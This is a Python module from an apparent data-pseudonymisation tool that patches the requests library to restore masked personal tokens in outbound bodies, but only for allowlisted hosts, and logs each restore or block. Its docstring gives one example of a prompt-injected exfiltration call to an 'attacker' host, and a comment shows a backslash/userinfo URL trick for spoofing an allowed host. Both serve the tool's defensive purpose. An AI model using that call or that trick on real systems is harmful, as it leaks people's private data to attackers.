"""Automatic egress-restore at the HTTP layer (the `requests` library).

Agents often send mail / write to external systems by writing *ad-hoc scripts*
that POST to an API with `requests` — there is no single mailer to wrap. A model
working in token-space can even build a token from char codes inside such a
script, so the literal ⟦token⟧ only exists in the final HTTP body. This patch
restores ⟦tokens⟧ in the OUTBOUND request body right before it leaves, using the
on-disk per-agent vault — so it catches those tokens no matter which script
produced them.

Design / safety:
  * Wraps `requests.sessions.Session.request`. Acts ONLY when the body actually
    contains the token marker ⟦ (so virtually every request is untouched).
  * ONLY for hosts you list in ``$HERMES_HOME/cloak/egress_hosts`` (one per line; a line
    ``example.com`` also covers ``*.example.com``). Restoring for any host would turn a
    prompt-injected ``requests.post("https://attacker", data="⟦לקוח_1⟧…")`` into a leak of
    real values. No file → nothing is restored (``egress_blocked`` in the audit log). A URL with
    userinfo or a backslash in it is never treated as an allowed host.
  * Limit: this runs in a separate process (the script), which cannot know the agent's session,
    so it restores any token of the agent's vault. Keep the list to hosts you trust with that.
  * Fail-open: any error → the original request is sent unchanged.
  * Idempotent install(); kill-switch env HERMESCLOAK_EGRESS_OFF=1.
  * Binary `files=` attachments (docx/pdf) are NOT handled here — use the
    format-aware file wrappers for those.
"""
import json as _json
import os

_INSTALLED = False


def _restore(s, home):
    from hermescloak.egress import restore_for_send
    return restore_for_send(s, home, where="http")


def _audit_restored(home, url):
    """Positive proof the egress net fired on a real send (host only, no PII)."""
    try:
        import json as _j
        import time as _t
        from urllib.parse import urlparse
        from hermescloak.egress import _home
        from hermescloak.fsutil import append_private
        append_private(os.path.join(_home(home), "cloak", "audit.log"),
                       _j.dumps({"kind": "egress_http_restored", "ts": _t.strftime("%F %T"),
                                 "host": urlparse(url).hostname or "?"}, ensure_ascii=False) + "\n")
    except Exception:
        pass


def _restore_blob(d, home):
    """Restore a str/bytes body. Handles a LITERAL token, and a base64-of-text body
    (e.g. Graph MIME sendMail base64-encodes the whole calendar/email MIME, hiding the
    ⟦token⟧ from a plain scan). Returns (new_value_or_original, changed)."""
    raw = d if isinstance(d, str) else None
    if raw is None:
        try: raw = d.decode("utf-8")
        except Exception: raw = None
    # 1) literal token in the (text) body
    if raw is not None and "⟦" in raw:
        out = _restore(raw, home)
        return (out if isinstance(d, str) else out.encode("utf-8")), True
    # 2) base64-encoded TEXT body — decode, restore, re-encode (binary base64 fails the
    #    utf-8 decode and is skipped, so real binary attachments are left untouched/safe)
    try:
        import base64
        decoded = base64.b64decode(d, validate=True)
        text = decoded.decode("utf-8")
        if "⟦" in text:
            reenc = base64.b64encode(_restore(text, home).encode("utf-8"))
            return (reenc if isinstance(d, bytes) else reenc.decode("ascii")), True
    except Exception:
        pass
    return d, False


def _host_of(url) -> str:
    """The host `requests` will really connect to, or "" when the URL is ambiguous. urllib.parse
    and urllib3 split "https://evil\\@allowed/" differently, so never trust urlparse alone."""
    from urllib.parse import urlsplit
    url = str(url or "")
    try:
        netloc = urlsplit(url).netloc
    except ValueError:
        return ""
    if "\\" in url.split("?", 1)[0].split("#", 1)[0] or "@" in netloc:
        return ""                                  # backslashes / userinfo: refuse, don't guess
    try:
        from urllib3.util import parse_url         # the parser requests itself uses
        host = parse_url(url).host or ""
    except Exception:
        host = urlsplit(url).hostname or ""
    return host.strip("[]").lower().rstrip(".")


def _allowed_host(url, home) -> bool:
    from hermescloak.egress import _home
    host = _host_of(url)
    try:
        with open(os.path.join(_home(home), "cloak", "egress_hosts"), encoding="utf-8") as f:
            allowed = {ln.split("#", 1)[0].strip().lower().rstrip(".") for ln in f}
    except OSError:
        return False
    allowed.discard("")
    return bool(host) and any(host == a or host.endswith("." + a) for a in allowed)


def _audit_blocked(home, url):
    try:
        import json as _j
        import time as _t
        from urllib.parse import urlparse
        from hermescloak.egress import _home
        from hermescloak.fsutil import append_private
        append_private(os.path.join(_home(home), "cloak", "audit.log"),
                       _j.dumps({"kind": "egress_blocked", "ts": _t.strftime("%F %T"),
                                 "host": urlparse(url).hostname or "?"}, ensure_ascii=False) + "\n")
    except Exception:
        pass


def _has_token(kwargs) -> bool:
    """Read-only: does the body carry a token (literal, or inside base64 text)? Never mutates."""
    j, d = kwargs.get("json"), kwargs.get("data")
    if j is not None and "⟦" in _json.dumps(j, ensure_ascii=False):
        return True
    if isinstance(d, dict):
        return any(isinstance(v, str) and "⟦" in v for v in d.values())
    if isinstance(d, (str, bytes)):
        raw = d if isinstance(d, str) else d.decode("utf-8", "ignore")
        if "⟦" in raw:
            return True
        try:
            import base64
            return "⟦" in base64.b64decode(d, validate=True).decode("utf-8")
        except Exception:
            return False
    return False


def _restore_leaves(obj, home):
    if isinstance(obj, str):
        return _restore(obj, home) if "⟦" in obj else obj
    if isinstance(obj, list):
        return [_restore_leaves(x, home) for x in obj]
    if isinstance(obj, tuple):
        return tuple(_restore_leaves(x, home) for x in obj)
    if isinstance(obj, dict):
        return {k: _restore_leaves(v, home) for k, v in obj.items()}
    return obj


def _restore_body(kwargs, home):
    """Restore ⟦tokens⟧ inside json=/data= bodies. Returns True if anything changed."""
    changed = False
    j = kwargs.get("json")
    if j is not None:
        if "⟦" in _json.dumps(j, ensure_ascii=False):
            # restore string LEAVES, not the dumped text: a real value containing a quote or a
            # backslash used to make the re-parsed JSON invalid → the request went out with tokens
            kwargs["json"] = _restore_leaves(j, home)
            changed = True
    d = kwargs.get("data")
    if isinstance(d, (str, bytes)):
        new, ch = _restore_blob(d, home)
        if ch:
            kwargs["data"] = new; changed = True
    elif isinstance(d, dict):
        for k, v in list(d.items()):
            if isinstance(v, str) and "⟦" in v:
                d[k] = _restore(v, home); changed = True
    return changed


def install(hermes_home: str | None = None) -> bool:
    """Monkey-patch requests so outbound bodies get egress-restored. Safe to call once."""
    global _INSTALLED
    if _INSTALLED or os.environ.get("HERMESCLOAK_EGRESS_OFF") == "1":
        return False
    try:
        import requests.sessions as _s
    except Exception:
        return False
    home = hermes_home or os.environ.get("HERMES_HOME")
    _orig = _s.Session.request

    def request(self, method, url, **kwargs):
        try:
            if (("json" in kwargs and kwargs["json"] is not None) or kwargs.get("data") is not None):
                if not _allowed_host(url, home):
                    if _has_token(kwargs):          # read-only: the body is never touched
                        _audit_blocked(home, url)   # tokens stay tokens for an unlisted host
                elif _restore_body(kwargs, home):
                    _audit_restored(home, url)   # positive proof the net fired (no PII; host only)
        except Exception:
            pass                       # fail-open: never block a request
        return _orig(self, method, url, **kwargs)

    request.__hermescloak_egress__ = True
    if not getattr(_s.Session.request, "__hermescloak_egress__", False):
        _s.Session.request = request
    _INSTALLED = True
    return True
